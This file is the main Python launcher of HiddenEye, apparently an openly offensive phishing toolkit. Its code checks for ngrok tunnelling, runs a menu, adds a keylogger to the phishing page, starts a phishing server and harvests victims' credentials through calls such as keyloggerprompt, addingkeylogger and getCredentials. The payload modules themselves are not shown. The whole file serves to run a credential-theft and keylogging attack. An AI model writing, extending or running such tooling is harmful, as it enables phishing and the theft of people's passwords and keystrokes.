#!/usr/bin/python3
#
#HiddenEye by Open Source Community
#
import multiprocessing
import gettext
import sys
from Defs.Checks import PermissionsManager, ConnectionManager
from Defs.Configurations import ConfigurationManager
from Defs.Actions import InterfaceManager, ServerManager
from Defs.Languages import LocalizationManager
from Defs.ArgumentHandler import ArgumentHandler
from os import system


RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

ArgumentHandler.parser.parse_args()
PermissionsManager.checkPermissions()
LocalizationManager.installGetText()
LocalizationManager.languageSelector()
ConnectionManager.checkConnection()
ConnectionManager.checkNgrok()
ConfigurationManager.ifSettingsNotExists()
ConfigurationManager.readConfig()


if __name__ == "__main__":
    try:
        InterfaceManager.runMainMenu()
        InterfaceManager.keyloggerprompt()
        InterfaceManager.addingkeylogger()

        InterfaceManager.inputCustom()
        ##############
        ServerManager.selectServer()

        multiprocessing.Process(target=ServerManager.runServer).start()
        InterfaceManager.getCredentials()

    except KeyboardInterrupt:
        InterfaceManager.endMessage()
        exit(0)
